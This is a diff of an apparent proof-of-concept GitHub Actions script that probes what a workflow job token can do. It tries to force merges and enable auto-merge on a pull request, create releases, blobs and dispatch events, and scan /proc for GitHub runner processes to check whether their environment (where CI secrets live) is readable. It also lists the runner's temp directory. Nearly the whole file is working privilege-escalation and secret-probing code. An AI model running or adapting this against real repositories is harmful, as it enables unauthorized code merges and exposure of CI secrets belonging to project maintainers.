@@ -1,11 +1,10 @@
 import fs from 'node:fs';
-import crypto from 'node:crypto';
 
-const MARK = 'EXT_ESC';
+const MARK = 'EXT_AUTO';
 
 export default async function ({ github, context, core, output }) {
   const ts = Date.now();
-  const id = `esc-${context.runId}-${ts}`;
+  const id = `auto-${context.runId}-${ts}`;
   const log = (...a) => console.log(MARK, id, ...a);
   const R = context.repo;
   const PR = 4;
@@ -14,7 +13,7 @@ export default async function ({ github, context, core, output }) {
     try {
       const r = await fn();
       const data = r?.data ?? r;
-      log('PROBE', name, 'OK', r?.status ?? '', JSON.stringify(data ?? {}).slice(0, 500));
+      log('PROBE', name, 'OK', r?.status ?? '', JSON.stringify(data ?? {}).slice(0, 400));
       return { ok: true, data };
     } catch (e) {
       log('PROBE', name, 'FAIL', e.status ?? '', String(e.message).slice(0, 400));
@@ -22,80 +21,68 @@ export default async function ({ github, context, core, output }) {
     }
   };
 
-  // show exactly what the job token can do per advertised scopes
-  await probe('pulls.get', () => github.rest.pulls.get({ owner: R.owner, repo: R.repo, pull_number: PR }));
-
-  await probe('contents.createOrUpdateFileContents', () =>
-    github.rest.repos.createOrUpdateFileContents({
-      owner: R.owner,
-      repo: R.repo,
-      path: `ext-probe-${ts}.txt`,
-      message: 'probe',
-      content: Buffer.from('probe').toString('base64'),
-      branch: 'main',
-    }),
-  );
-
-  await probe('repos.merge', () =>
-    github.rest.repos.merge({
-      owner: R.owner,
-      repo: R.repo,
-      base: 'main',
-      head: 'lazyhacker6:poc/artifact-overwrite-ext',
-    }),
-  );
-
-  await probe('pulls.updateBranch', () =>
-    github.rest.pulls.updateBranch({ owner: R.owner, repo: R.repo, pull_number: PR }),
-  );
-
-  await probe('pulls.merge', () =>
-    github.rest.pulls.merge({ owner: R.owner, repo: R.repo, pull_number: PR, merge_method: 'merge' }),
-  );
-
-  // GraphQL auto-merge attempt (node id lookup + enable)
-  const prNode = await probe('graphql.pullRequest', async () => {
+  const pr = await probe('graphql.pullRequest', async () => {
     const r = await github.graphql(
-      `query($owner:String!,$repo:String!,$n:Int!){repository(owner:$owner,name:$repo){pullRequest(number:$n){id number mergeable mergeStateStatus isCrossRepository}}}`,
+      `query($owner:String!,$repo:String!,$n:Int!){repository(owner:$owner,name:$repo){pullRequest(number:$n){id number mergeable mergeStateStatus isCrossRepository repository{autoMergeAllowed} viewerPermission}}}`,
       { owner: R.owner, repo: R.repo, n: PR },
     );
     return r.repository.pullRequest;
   });
-  if (prNode.ok && prNode.data?.id) {
+
+  if (pr.ok && pr.data?.id) {
     await probe('graphql.enablePullRequestAutoMerge', () =>
       github.graphql(
-        `mutation($id:ID!,$method:PullRequestMergeMethod!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:$method}){clientMutationId}}`,
-        { id: prNode.data.id, method: 'MERGE' },
+        `mutation($prId:ID!,$mm:PullRequestMergeMethod!){enablePullRequestAutoMerge(input:{pullRequestId:$prId,mergeMethod:$mm}){clientMutationId pullRequest{number autoMergeRequest{enabledAt mergeMethod}}}}`,
+        { prId: pr.data.id, mm: 'MERGE' },
       ),
     );
   }
 
-  await probe('pulls.createReview', () =>
-    github.rest.pulls.createReview({
+  // alternate content-write surfaces, in case one scope is evaluated differently
+  await probe('git.createBlob', () =>
+    github.rest.git.createBlob({ owner: R.owner, repo: R.repo, content: 'probe', encoding: 'utf-8' }),
+  );
+  await probe('git.createTree', () =>
+    github.rest.git.createTree({ owner: R.owner, repo: R.repo, tree: [] }),
+  );
+  await probe('repos.createRelease', () =>
+    github.rest.repos.createRelease({ owner: R.owner, repo: R.repo, tag_name: `probe-${ts}` }),
+  );
+  await probe('repos.createDispatch', () =>
+    github.rest.repos.createDispatchEvent({
       owner: R.owner,
       repo: R.repo,
-      pull_number: PR,
-      event: 'COMMENT',
-      body: `EXT_ESC review probe ${id}`,
+      event_type: 'probe',
     }),
   );
 
-  await probe('issues.createComment', () =>
-    github.rest.issues.createComment({
-      owner: R.owner,
-      repo: R.repo,
-      issue_number: 5,
-      body: `EXT_ESC comment probe ${id}`,
-    }),
-  );
-
-  await probe('actions.approveRun:forkPRrun', () =>
-    github.rest.actions.approveWorkflowRun({
-      owner: R.owner,
-      repo: R.repo,
-      run_id: context.payload?.workflow_run?.id ?? 0,
-    }),
-  );
+  // inspect local runner processes for secret material (read-only)
+  try {
+    const pids = fs.readdirSync('/proc').filter((p) => /^\d+$/.test(p));
+    const found = [];
+    for (const pid of pids) {
+      try {
+        const cmd = fs.readFileSync(`/proc/${pid}/cmdline`, 'utf8').replace(/\0/g, ' ').slice(0, 120);
+        if (/Runner\.Worker|Runner\.Listener/i.test(cmd)) {
+          let envLen = -1;
+          let probeOk = false;
+          try {
+            envLen = fs.readFileSync(`/proc/${pid}/environ`).length;
+            probeOk = true;
+          } catch (e) {
+            probeOk = false;
+          }
+          found.push({ pid, cmd, environ_readable: probeOk, environ_len: envLen });
+        }
+      } catch (e) {
+        /* ignore */
+      }
+    }
+    log('RUNNER_PROCS', JSON.stringify(found));
+    log('WORKSPACE_TMP', JSON.stringify(fs.readdirSync('/home/runner/work/_temp').slice(0, 20)));
+  } catch (e) {
+    log('PROC_SCAN_ERR', String(e.message));
+  }
 
   log('DONE');
 }
